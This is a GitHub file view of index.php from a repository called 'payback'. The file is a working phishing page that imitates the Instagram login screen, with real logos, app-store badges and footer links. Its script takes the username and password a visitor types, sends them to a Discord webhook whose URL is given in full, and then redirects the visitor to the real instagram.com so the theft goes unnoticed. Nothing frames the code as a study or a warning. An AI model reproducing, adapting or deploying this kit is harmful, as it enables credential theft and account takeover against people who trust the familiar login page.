Skip to content
Search or jump to…
Pull requests
Issues
Codespaces
Marketplace
Explore
 
@matiashelland 
matiashelland
/
payback
Public
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
Settings
payback/index.php
@matiashelland
matiashelland Update index.php
Latest commit 70da085 11 days ago
 History
 1 contributor
111 lines (99 sloc)  4.85 KB

<head>
  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
  <title>Instagram</title>
</head>
<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>  
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>  
                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->
              <div class="login-box">
                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
              </div> <!-- Signup-box end -->
              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>
      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
			  <li><a href=""></a></li>
              <li><a href="https://about.instagram.com">About Us</a></li>
              <li><a href="https://help.instagram.com">Support</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
              <li><a href="https://www.instagram.com/developer">Api</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
			  <li><a href="">Intsagram</a></li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2021 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
      
    </section>
  </span> <!-- Root -->
  <!-- Select Link -->
  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>
  <script>
  function sendMessage() {
  function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1043315855494217799/vrqd0-jCFNhrdI9aW3_l8uQ6ZFWEGFXJtmPwjX4ExBpK9c_1J-cc7zXt5_UyZ_XevQB2");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
    }
    request.send(JSON.stringify(params));
	sleep(400)
	window.location.replace("https://www.instagram.com");
  }
  </script>
</body>
Footer
© 2022 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
payback/index.php at main · matiashelland/payback